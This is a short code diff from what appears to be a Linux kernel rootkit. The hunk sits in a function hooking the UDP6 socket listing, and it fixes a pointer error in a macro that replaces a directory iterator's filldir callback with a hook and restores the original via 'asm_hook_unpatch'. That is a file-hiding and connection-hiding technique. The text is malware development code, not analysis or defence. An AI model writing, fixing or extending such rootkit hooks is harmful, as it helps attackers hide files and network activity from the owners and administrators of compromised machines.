@@ -909,7 +909,7 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 	    int ret; \
 	    int (*original_iterate)(struct file *, struct dir_context *); \
             original_##NAME##_filldir = context->actor; \
-	    &context->actor = NAME##_filldir; \
+	    context->actor = NAME##_filldir; \
             \
             original_iterate = asm_hook_unpatch(NAME##_iterate); \
             ret = original_iterate(file, context); \
